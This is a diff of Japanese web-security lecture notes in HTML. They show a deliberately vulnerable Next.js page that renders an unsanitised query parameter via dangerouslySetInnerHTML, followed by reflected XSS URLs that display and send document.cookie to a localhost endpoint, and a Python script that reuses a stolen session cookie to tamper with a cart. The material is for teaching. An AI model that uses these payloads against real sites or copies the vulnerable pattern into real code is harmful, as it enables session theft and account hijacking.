@@ -860,22 +860,24 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       サーバサイドの処理</h2>
       <p><code>/api/news</code> にアクセスがあったときに実行される処理は
       <code>src/app/news/route.ts</code> に記載されます。</p>
-      <div class="sourceCode" id="cb25"
+      <div class="sourceCode" id="cb25" data-caption="src/app/news/route.ts (抜粋)"
+      data-startFrom="4"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb25-4"><a href="#cb25-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
+      <div class="sourceCode" id="cb26"
       data-caption="src/app/news/route.ts (抜粋) Cookie によりDBから取得するデータを変更"
-      data-startFrom="11"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 10;"><span id="cb25-11"><a href="#cb25-11"></a><span class="co">// リクエストに含まれるクッキー region の値を regionStr に取得</span></span>
-<span id="cb25-12"><a href="#cb25-12"></a><span class="kw">const</span> cookieStore <span class="op">=</span> <span class="cf">await</span> <span class="fu">cookies</span>()<span class="op">;</span></span>
-<span id="cb25-13"><a href="#cb25-13"></a><span class="kw">const</span> regionStr <span class="op">=</span> cookieStore<span class="op">.</span><span class="fu">get</span>(cKey)<span class="op">?.</span><span class="at">value</span> <span class="op">??</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
-<span id="cb25-14"><a href="#cb25-14"></a></span>
-<span id="cb25-15"><a href="#cb25-15"></a><span class="co">// 文字列を列挙子 Region.XXXX に変換（不正な文字列は Region.OSAKA にする）</span></span>
-<span id="cb25-16"><a href="#cb25-16"></a><span class="kw">const</span> region <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)</span>
-<span id="cb25-17"><a href="#cb25-17"></a>  <span class="op">?</span> (regionStr <span class="im">as</span> Region)</span>
-<span id="cb25-18"><a href="#cb25-18"></a>  <span class="op">:</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
-<span id="cb25-19"><a href="#cb25-19"></a></span>
-<span id="cb25-20"><a href="#cb25-20"></a><span class="co">// DBから記事を全件取得。実設計では take/skip でページネーションすべき</span></span>
-<span id="cb25-21"><a href="#cb25-21"></a><span class="kw">const</span> newsItems<span class="op">:</span> NewsItem[] <span class="op">=</span> <span class="cf">await</span> prisma<span class="op">.</span><span class="at">newsItem</span><span class="op">.</span><span class="fu">findMany</span>({</span>
-<span id="cb25-22"><a href="#cb25-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span></span>
-<span id="cb25-23"><a href="#cb25-23"></a>  orderBy<span class="op">:</span> { publishedAt<span class="op">:</span> <span class="st">&quot;desc&quot;</span> }<span class="op">,</span></span>
-<span id="cb25-24"><a href="#cb25-24"></a>})<span class="op">;</span></span></code></pre></div>
+      data-startFrom="11"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 10;"><span id="cb26-11"><a href="#cb26-11"></a><span class="co">// リクエストに含まれるクッキー region の値を regionStr に取得</span></span>
+<span id="cb26-12"><a href="#cb26-12"></a><span class="kw">const</span> cookieStore <span class="op">=</span> <span class="cf">await</span> <span class="fu">cookies</span>()<span class="op">;</span></span>
+<span id="cb26-13"><a href="#cb26-13"></a><span class="kw">const</span> regionStr <span class="op">=</span> cookieStore<span class="op">.</span><span class="fu">get</span>(cKey)<span class="op">?.</span><span class="at">value</span> <span class="op">??</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
+<span id="cb26-14"><a href="#cb26-14"></a></span>
+<span id="cb26-15"><a href="#cb26-15"></a><span class="co">// 文字列を列挙子 Region.XXXX に変換（不正な文字列は Region.OSAKA にする）</span></span>
+<span id="cb26-16"><a href="#cb26-16"></a><span class="kw">const</span> region <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)</span>
+<span id="cb26-17"><a href="#cb26-17"></a>  <span class="op">?</span> (regionStr <span class="im">as</span> Region)</span>
+<span id="cb26-18"><a href="#cb26-18"></a>  <span class="op">:</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
+<span id="cb26-19"><a href="#cb26-19"></a></span>
+<span id="cb26-20"><a href="#cb26-20"></a><span class="co">// DBから記事を全件取得。実設計では take/skip でページネーションすべき</span></span>
+<span id="cb26-21"><a href="#cb26-21"></a><span class="kw">const</span> newsItems<span class="op">:</span> NewsItem[] <span class="op">=</span> <span class="cf">await</span> prisma<span class="op">.</span><span class="at">newsItem</span><span class="op">.</span><span class="fu">findMany</span>({</span>
+<span id="cb26-22"><a href="#cb26-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span></span>
+<span id="cb26-23"><a href="#cb26-23"></a>  orderBy<span class="op">:</span> { publishedAt<span class="op">:</span> <span class="st">&quot;desc&quot;</span> }<span class="op">,</span></span>
+<span id="cb26-24"><a href="#cb26-24"></a>})<span class="op">;</span></span></code></pre></div>
       <ul>
       <li>口頭説明</li>
       </ul>
@@ -916,24 +918,24 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       </figure>
       <p>まずは、<code>src/app/news/page.tsx</code>
       のなかでクエリパラメータを処理するプログラムについて確認しています。</p>
-      <div class="sourceCode" id="cb26"
-      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
-      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb26-25"><a href="#cb26-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
       <div class="sourceCode" id="cb27"
-      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
-      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb27-38"><a href="#cb27-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
-<span id="cb27-39"><a href="#cb27-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
-<span id="cb27-40"><a href="#cb27-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
-<span id="cb27-41"><a href="#cb27-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
+      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb27-25"><a href="#cb27-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
       <div class="sourceCode" id="cb28"
+      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
+      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb28-38"><a href="#cb28-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb28-39"><a href="#cb28-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
+<span id="cb28-40"><a href="#cb28-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
+<span id="cb28-41"><a href="#cb28-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
+      <div class="sourceCode" id="cb29"
       data-caption="src/app/news/page.tsx (抜粋) サニタイズせずに出力" data-startFrom="140"><pre
-      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb28-140"><a href="#cb28-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
-<span id="cb28-141"><a href="#cb28-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
-<span id="cb28-142"><a href="#cb28-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
-<span id="cb28-143"><a href="#cb28-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
-<span id="cb28-144"><a href="#cb28-144"></a>    さん、こんにちは！</span>
-<span id="cb28-145"><a href="#cb28-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
-<span id="cb28-146"><a href="#cb28-146"></a>)}</span></code></pre></div>
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb29-140"><a href="#cb29-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
+<span id="cb29-141"><a href="#cb29-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
+<span id="cb29-142"><a href="#cb29-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
+<span id="cb29-143"><a href="#cb29-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
+<span id="cb29-144"><a href="#cb29-144"></a>    さん、こんにちは！</span>
+<span id="cb29-145"><a href="#cb29-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
+<span id="cb29-146"><a href="#cb29-146"></a>)}</span></code></pre></div>
       <p>XSS脆弱性の原因となっているのは <strong>第40行目</strong> と <strong>第143行目</strong>
       になります。いずれか一方で適切な処理がされていれば XSS
       は生じません。例えば、<strong>第143行目</strong> を
@@ -942,44 +944,44 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>なお、反射型XSSは、詳細は<a
       href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>のようなリンクに仕込まれる可能性があります。</p>
       <h3 data-number="7.0.1" id="例1"><span class="header-section-number">7.0.1</span> 例1</h3>
-      <div class="sourceCode" id="cb29" data-caption="無害なクエリパラメータ"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
+      <div class="sourceCode" id="cb30" data-caption="無害なクエリパラメータ"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
       <figure>
       <img src="figs/01/xss-01.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
       <h3 data-number="7.0.2" id="例2"><span class="header-section-number">7.0.2</span> 例2</h3>
-      <div class="sourceCode" id="cb30" data-caption="無害なクエリパラメータ？🤔"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
+      <div class="sourceCode" id="cb31" data-caption="無害なクエリパラメータ？🤔"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
       <figure>
       <img src="figs/01/xss-02.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
       <h3 data-number="7.0.3" id="例3"><span class="header-section-number">7.0.3</span> 例3</h3>
-      <div class="sourceCode" id="cb31" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
+      <div class="sourceCode" id="cb32" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
       <figure>
       <img src="figs/01/xss-03.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
       <h3 data-number="7.0.4" id="例4"><span class="header-section-number">7.0.4</span> 例4</h3>
-      <div class="sourceCode" id="cb32"
+      <div class="sourceCode" id="cb33"
       data-caption="💀💀 XSS脆弱性を利用してCookieを取得して表示"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
       <figure>
       <img src="figs/01/xss-04.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
       <h3 data-number="7.0.5" id="例5"><span class="header-section-number">7.0.5</span> 例5</h3>
-      <div class="sourceCode" id="cb33"
+      <div class="sourceCode" id="cb34"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
       <ul>
       <li>(URLエンコーディング/パーセントエンコーディング)[https://tech-unlimited.com/urlencode.html]</li>
       </ul>
-      <div class="sourceCode" id="cb34"
+      <div class="sourceCode" id="cb35"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信 (URLエンコード後)"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
       <pre><code>npx prisma studio</code></pre>
       <h2 data-number="7.1" id="cookie-が窃取されると"><span
       class="header-section-number">7.1</span> Cookie が窃取されると…</h2>
@@ -987,38 +989,38 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <img src="figs/01/xss-05.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <div class="sourceCode" id="cb36" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
-      class="sourceCode python"><code class="sourceCode python"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
-<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
-<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
-<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
-<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
-<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
-<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
-<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
-<span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
-<span id="cb36-15"><a href="#cb36-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
-<span id="cb36-16"><a href="#cb36-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
-<span id="cb36-17"><a href="#cb36-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
-<span id="cb36-18"><a href="#cb36-18" aria-hidden="true" tabindex="-1"></a>)</span>
-<span id="cb36-19"><a href="#cb36-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-20"><a href="#cb36-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
-<span id="cb36-21"><a href="#cb36-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-22"><a href="#cb36-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
-<span id="cb36-23"><a href="#cb36-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
-<span id="cb36-24"><a href="#cb36-24" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb36-25"><a href="#cb36-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
-<span id="cb36-26"><a href="#cb36-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
-<span id="cb36-27"><a href="#cb36-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
-<span id="cb36-28"><a href="#cb36-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
-<span id="cb36-29"><a href="#cb36-29" aria-hidden="true" tabindex="-1"></a>  )</span>
-<span id="cb36-30"><a href="#cb36-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
-<span id="cb36-31"><a href="#cb36-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
+      <div class="sourceCode" id="cb37" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
+      class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
+<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
+<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
+<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
+<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
+<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
+<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
+<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
+<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
+<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
+<span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-25"><a href="#cb37-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
+<span id="cb37-26"><a href="#cb37-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
+<span id="cb37-27"><a href="#cb37-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
+<span id="cb37-28"><a href="#cb37-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
+<span id="cb37-29"><a href="#cb37-29" aria-hidden="true" tabindex="-1"></a>  )</span>
+<span id="cb37-30"><a href="#cb37-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
+<span id="cb37-31"><a href="#cb37-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
       <!-- ---------------------------------------- -->
     </main>
 
